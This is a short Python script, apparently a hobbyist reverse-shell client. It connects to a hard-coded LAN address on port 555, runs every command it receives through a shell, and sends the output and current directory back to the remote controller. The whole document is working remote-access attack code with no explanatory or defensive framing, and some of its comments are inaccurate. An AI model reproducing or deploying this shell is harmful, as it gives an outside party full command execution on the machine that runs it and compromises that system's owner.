import socket
import os
import subprocess

s = socket.socket()

# Myself IP using cmd > ipconfig
host = "192.168.15.216"
port = 555

s.connect((host, port))

while True:
    # 16 Bit binary data receive
    data = s.recv(1024)

    # Check 2bit
    if data[:2].decode("utf-8") == 'cd':

        # Change directory
        # Check 3bit
        os.chdir(data[3:].decode("utf-8"))

    if len(data)> 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)


        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWD))

        print(output_str)